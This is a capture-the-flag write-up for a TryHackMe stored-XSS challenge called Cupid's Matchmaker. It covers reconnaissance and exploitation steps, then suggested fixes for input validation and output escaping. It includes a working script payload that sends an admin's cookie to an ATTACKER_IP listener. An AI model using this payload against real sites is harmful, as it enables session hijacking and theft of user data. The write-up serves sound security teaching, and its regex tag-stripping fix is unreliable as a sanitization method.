# Cupid's Matchmaker - CTF Challenge Write-Up

## Overview

**Cupid's Matchmaker** is an easy-difficulty TryHackMe web security challenge that demonstrates the dangers of **Stored Cross-Site Scripting (XSS)** combined with inadequate input validation and output encoding.

**Challenge Link:** [TryHackMe - Cupid's Matchmaker](https://tryhackme.com/)  
**Difficulty:** 🟢 Easy  
**Category:** Web Security, XSS  
**Time to Solve:** ~30 minutes

---

## What You'll Learn

This challenge teaches critical web security concepts through hands-on exploitation:

### Core Vulnerabilities

1. **Stored XSS** — Malicious code persists in database and executes for all users
2. **Missing Input Validation** — No filtering on user-submitted text
3. **Missing Output Encoding** — User data rendered as raw HTML without escaping
4. **Cookie Exfiltration** — Stealing sensitive session data from privileged users

### Security Concepts

- **Stored vs Reflected XSS** — How persistence changes the threat model
- **Attack Surface Recognition** — Identifying where user input will be viewed
- **Data Exfiltration** — Using JavaScript to steal sensitive information
- **Trusted User Exploitation** — Targeting admins/moderators who review user content
- **Base64 Encoding** — Safely transmitting binary/special character data over HTTP

---

## Challenge Description

Cupid's Matchmaker is a Valentine's Day themed matchmaking web application. Users fill out personality surveys, and the app claims that "real humans read your personality survey" to find compatible matches.

**The Vulnerability:** The application stores user input without sanitization and displays it to admins without escaping HTML/JavaScript. An attacker can inject malicious JavaScript that executes in the admin's browser, stealing their session cookies and sensitive data.

---

## Challenge Architecture

### Application Flow
```
User Submission
↓
Survey Form (no validation)
↓
Database Storage (no sanitization)
↓
Admin Panel (displays raw HTML)
↓
JavaScript Executes (admin's browser)
↓
Cookies Exfiltrated (sent to attacker)
```


### Vulnerable Endpoints

| Endpoint | Method | Purpose | Vulnerability |
|----------|--------|---------|----------------|
| `/survey` | GET/POST | Submit personality survey | ❌ No input filtering |
| `/admin` | GET | View admin dashboard | Requires authentication |
| `/` | GET | Homepage | Application landing page |
| `/login` | GET/POST | Admin login | Requires valid credentials |

---

## Quick Start

### Prerequisites

**System Requirements:**
- Linux/macOS or WSL on Windows
- Python 3.8+
- Access to TryHackMe

**Tools Used:**
```bash
# Network scanning
nmap

# Web enumeration
ffuf (or gobuster)

# Python (built-in)
python3
```

### Exploitation Steps

1. **Start the TryHackMe machine** and note the target IP

2. **Scan the target:**
```bash
   nmap -sC -sV TARGET_IP
```

3. **Enumerate web endpoints:**
```bash
   ffuf -u http://TARGET_IP:5000/FUZZ -w /path/to/wordlist
```

4. **Identify the vulnerability:**
   - Read the homepage: "Real humans read your personality survey"
   - Realize: Data stored + Admins will view it = Stored XSS

5. **Set up listener:**
```bash
   python3 -m http.server 8000
```

6. **Craft and submit payload:**
```
   <script>fetch('http://[ATTACKER_IP]:8000/?cookie=' + btoa(document.cookie));</script>
```

7. **Monitor listener for admin's cookie**

8. **Decode the base64 cookie** → Flag revealed!

---

**Key Points:**
- Stored XSS is different from Reflected XSS
- The vulnerability isn't triggered by YOU — it's triggered by the ADMIN
- Our job is to craft a payload that executes in THEIR browser
- Their cookies contain the flag

---

## Key Vulnerabilities

### 1. Missing Input Validation (CRITICAL)

**The Problem:**
```html
<!-- Unsafe HTML form -->
<textarea name="ideal_date"></textarea>

<!-- User can submit: -->
<script>malicious code</script>
```

**Impact:**
- Any HTML/JavaScript accepted without filtering
- No length limits, no format validation
- Direct path to stored XSS

**Fix:**
```python
# Validate input
import re
def validate_survey_input(text):
    # Remove HTML tags
    text = re.sub(r'<[^>]*>', '', text)
    # Limit length
    if len(text) > 500:
        return None
    return text
```

---

### 2. Missing Output Encoding (CRITICAL)

**The Problem:**
```python
# UNSAFE - Admin panel code
@app.route('/admin/submissions')
def view_submissions():
    submissions = db.get_all_submissions()
    # Renders user input as raw HTML
    return render_template('submissions.html', data=submissions)

# Template (Jinja2) - UNSAFE
{{ submission.text }}  <!-- ❌ No escaping -->
```

**Impact:**
- User-controlled data rendered as executable JavaScript
- Admin's browser interprets `<script>` as code, not text
- Full compromise of admin's session

**Fix:**
```jinja2
<!-- SAFE - With escaping -->
{{ submission.text | escape }}  <!-- ✅ HTML entities -->

<!-- Or in Python: -->
from markupsafe import escape
safe_text = escape(submission.text)
```

---

### 3. Insufficient Authentication (HIGH)

**The Problem:**
- Survey endpoint requires no authentication
- Any user can submit malicious payloads
- No rate limiting on submissions

**Fix:**
- Implement CAPTCHA or rate limiting
- Require email verification before survey submission
- Add submission review workflow with human approval

---

## Disclaimer

**Educational Purpose Only:**

This challenge is created for authorized learning on TryHackMe. The techniques described are for **educational and authorized testing purposes only**.

**Legal Boundaries:**
- DO NOT use these techniques on systems you don't own
- DO NOT exploit vulnerabilities in production environments
- DO NOT cause harm or damage

**DO:**
- Use knowledge on dedicated lab environments (HTB, TryHackMe, DVWA)
- Participate in legal bug bounty programs
- Only test systems with explicit written permission

**Unauthorized access to computer systems is illegal** under:
- Computer Fraud and Abuse Act (CFAA) — United States
- Computer Misuse Act — United Kingdom
- Similar laws in all countries

---

## Author

**Bishal Kumar Baishya** (Cybersecurity Student)

**Specializations:**
- Offensive Security & Penetration Testing
- Web Application Security
- Bug Bounty Hunting

**GitHub:** [GitHub](https://github.com/Bishal-Kumar-Baishya)
**LinkedIn:** [LinkedIn](https://www.linkedin.com/in/bishal-kumar-baishya-022b56412)

---

## License

This write-up is provided for educational purposes. Feel free to reference, share, and learn from it.

**Attribution:** Please credit "Bishal" when referencing this work.

---

**Last Updated:** October 7, 2026